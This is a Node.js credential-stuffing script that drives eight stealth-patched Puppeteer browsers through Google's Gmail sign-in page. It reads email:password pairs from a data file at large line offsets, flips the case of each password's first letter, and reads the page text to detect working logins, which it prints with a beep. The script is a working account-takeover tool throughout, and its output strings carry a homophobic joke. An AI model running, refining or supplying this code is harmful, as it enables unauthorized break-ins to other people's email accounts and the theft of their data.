const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const values = ['Wrong', '2-Step','Choose', 'keep', 'Verification', "someone", "changed", "Standard", "find", "robot", "Step", "email", "Check", "check", "2", "sent", "valid", "locked", "Type", "Open", "verify", "Verify"];
puppeteer.use(StealthPlugin());
var JFile = require('jfile');
require('dotenv').config()
const  {exec} = require('child_process') 

process.setMaxListeners(0);

//Check Data File
var myF = new JFile("./data.txt");


//Swap front character to uppecase
function capitalizeWords(arr) {
  return arr.map(element => {
    return element.charAt(0).toUpperCase() + element.slice(1).replace(/\r/g, "");
  });
}

//Swap front character to lowercase
function decapitalizeWords(arr) {
  return arr.map(element => {
    return element.charAt(0).toLowerCase() + element.slice(1).replace(/\r/g, "");
  });
}

//Check if front character upper
function checkUpper(string) {
  return /^\p{Lu}/u.test(string);
}

(async () => {
  //Initialize puppeteer
  const cluster = await Cluster.launch({
    concurrency: Cluster.CONCURRENCY_BROWSER,
    maxConcurrency: 8,
  });


  await cluster.task(async ({ _ , data: start }) => {

    const browser = await puppeteer.launch({
      headless: false,
      args: [
        '--no-sandbox',
        '--disable-gpu',
        '--enable-webgl',
        '--window-size=800,800'
      ]
    });

    const loginUrl = "https://accounts.google.com/AccountChooser?service=mail&continue=https://google.com&hl=en";
    const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
    const page = await browser.newPage();
    await page.setUserAgent(ua);
    await page.goto(loginUrl, { waitUntil: 'networkidle2' });


  //Loop through data
  for (let i = start; i < start + 9000; i++) {
    try {

      //Search for email box in gmail login page
      await page.type('input[type="email"]', myF.lines[i].split(":")[0]);

      //Hit Enter once the box filled
      await page.keyboard.press('Enter');

      //Timeout for loading transition between email page and password page
      await page.waitForTimeout(3000);

      //Check whether the email is valid or not
      const error = await page.evaluate((strings) => {
        const text = document.body.innerText;
        return strings.filter(string => text.includes(string));
      }, values);

      //If email not valid
      if (error.includes("find") || error.includes("valid")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      } else if (error.includes("locked") || error.includes("Type") || error.includes("Check") || error.includes("Open") || error.includes("robot") || error.includes("someone") || error.includes("Choose")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      }

      //If email is valid enter password
      await page.type('input[type="password"]', (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));
      //Hit Enter once the box filled
      await page.keyboard.press('Enter');

      //Timeout for loading transition between email page and password page (Adjust this duration based on your internet speed)
      await page.waitForTimeout(3000);

      //Check whether the password is correct or not
      const matches = await page.evaluate((strings) => {
        const text = document.body.innerText;
        return strings.filter(string => text.includes(string));
      }, values);

      if(matches.includes("2-Step") || matches.includes("verification") || matches.includes("Confirm") || matches.includes("Standard")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      }
      

      //If password valid
      if (matches.includes("verify") || matches.includes("keep") ) {
        exec('rundll32 user32.dll, MessageBeep')
        console.log(1 + i + ": Sorry, You're Gay : " + myF.lines[i].split(":")[0] + " : " + (checkUpper(myF.lines[i].split(":")[1]) ? myF.lines[i].split(":")[1].charAt(0).toLowerCase() + myF.lines[i].split(":")[1].substring(1): myF.lines[i].split(":")[1].charAt(0).toUpperCase() + myF.lines[i].split(":")[1].substring(1)))
      }

      await page.goto(loginUrl, { waitUntil: 'networkidle2' });
      continue

    } catch (error) {
      console.log(1 + i + ": Yay, You're Straight!")
      await page.goto(loginUrl, { waitUntil: 'networkidle2' });
      continue;

    }
  }
  });

  

  cluster.queue(208800);
  cluster.queue(107241);
  cluster.queue(88224);
  cluster.queue(220026);
  cluster.queue(166260);
  cluster.queue(186681);
  cluster.queue(175005);

  await cluster.idle();
  await cluster.close();

})();


